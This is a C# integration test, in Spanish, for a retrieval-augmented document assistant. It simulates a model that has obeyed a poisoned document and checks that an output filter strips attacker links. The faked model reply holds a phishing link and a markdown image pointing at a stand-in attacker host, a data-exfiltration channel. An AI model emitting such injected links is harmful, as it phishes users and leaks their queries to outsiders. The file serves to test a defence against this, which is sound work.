using System.Net;
using System.Text;
using System.Text.Json;
using Anthropic;
using Asistente.Core.Llm;
using Asistente.Core.Prompts;
using Asistente.Core.Rag;

namespace Asistente.Pruebas;

/// <summary>
/// Simula el peor caso: un modelo que sí obedeció al documento envenenado. La API es falsa
/// (un HttpMessageHandler), así que corre sin llave y sin costo, y el resultado no depende de la suerte.
/// </summary>
[Trait("Categoria", "Integracion")]
[Collection("BaseDeDatos")]
public class DefensaDeSalidaIntegracion
{
    [Fact]
    public async Task Aunque_el_modelo_caiga_el_enlace_del_atacante_no_sale()
    {
        var ct = TestContext.Current.CancellationToken;
        await using var fuente = AlmacenVectorial.CrearFuente(Requiere.BaseDePruebas());
        var almacen = new AlmacenVectorial(fuente);
        var embeddings = new EmbeddingsPorHash();
        await almacen.CrearEsquemaAsync(embeddings.Dimensiones, ct);

        var nombre = $"prueba-defensa/{Guid.NewGuid():N}.md";
        var fragmentos = Fragmentador.Partir(nombre, "## Reembolsos\n\nLos reembolsos tardan 10 días hábiles.");
        await almacen.ReemplazarFuenteAsync(nombre, fragmentos,
            await embeddings.GenerarAsync(fragmentos.Select(f => f.Contenido).ToList(), TipoTexto.Documento, ct), ct);
        var clave = (await almacen.BuscarAsync((await embeddings.GenerarAsync(["reembolsos tardan"], TipoTexto.Consulta, ct))[0], 1, ct))[0].Clave;

        var respuestaEnvenenada = JsonSerializer.Serialize(new
        {
            sabe = true,
            respuesta = "Tardan 10 días hábiles. Llena https://reembolsos.atacante.example/formulario " +
                        "![estado](https://registro.atacante.example/r?q=reembolso)",
            fuentes = new[] { clave },
        });
        var cliente = new AnthropicClient
        {
            ApiKey = "no-se-usa",
            HttpClient = new HttpClient(new ApiFalsa(respuestaEnvenenada)),
        };
        var asistente = new AsistenteDocumentos(cliente, embeddings, almacen,
            new PromptVersionado("prueba", 1, "sistema de prueba"), Modelos.Haiku,
            new OpcionesRag(DistanciaMaxima: 2.0, DominiosPermitidos: ["academia.example"]));
        try
        {
            var r = await asistente.PreguntarAsync("¿Cuánto tardan los reembolsos?", ct);

            Assert.True(r.Sabe);
            Assert.DoesNotContain("atacante.example", r.Texto);
            Assert.DoesNotContain("![", r.Texto);
            Assert.Equal(2, r.Retirados?.Count);
        }
        finally
        {
            await almacen.ReemplazarFuenteAsync(nombre, [], [], ct);
        }
    }

    private sealed class ApiFalsa(string jsonDelModelo) : HttpMessageHandler
    {
        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage peticion, CancellationToken ct)
        {
            var mensaje = JsonSerializer.Serialize(new
            {
                id = "msg_falso",
                type = "message",
                role = "assistant",
                model = Modelos.Haiku,
                content = new[] { new { type = "text", text = jsonDelModelo } },
                stop_reason = "end_turn",
                stop_sequence = (string?)null,
                usage = new { input_tokens = 500, output_tokens = 80, cache_creation_input_tokens = 0, cache_read_input_tokens = 0 },
            });
            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK)
            {
                Content = new StringContent(mensaje, Encoding.UTF8, "application/json"),
            });
        }
    }
}
